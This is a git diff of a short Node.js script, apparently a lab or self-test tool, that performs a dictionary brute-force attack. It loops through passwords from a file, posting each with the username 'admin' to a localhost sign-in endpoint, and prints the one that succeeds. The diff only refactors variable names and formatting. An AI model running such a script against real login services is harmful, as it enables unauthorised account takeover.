@@ -1,8 +1,6 @@
 const request = require("request");
-
 const fs = require("fs");
 const axios = require("axios");
-const signinUrl = "http://localhost:8081/api/auth/signin";
 const commonPasswordsFile = "user_password.txt";
 const username = "admin";
 
@@ -13,25 +11,22 @@ fs.readFile(commonPasswordsFile, "utf8", (err, data) => {
     possiblePasswords.replace("\r", "")
 
   );
-
   rec_bf(username, commonPasswords, 0, "");
-
 });
 async function rec_bf(username, commonPasswords, i, passwordR) {
   if (!commonPasswords) {
     console.log(
-      `Found correct password for username ${username} : ${passwordR}`
+      `correct password for username ${username} : ${passwordR}`
     );
     return;
   }
   const password = commonPasswords[i];
-  const loginData = {
+  const dataAdmin = {
     username: username,
     password: password,
-
   };
   await axios
-    .post(signinUrl, loginData)
+    .post("http://localhost:8081/api/auth/signin", dataAdmin)
     .then((response) => {
       rec_bf(username, null, i, password);
 
@@ -50,5 +45,3 @@ async function rec_bf(username, commonPasswords, i, passwordR) {
     });
 
 }
-
-
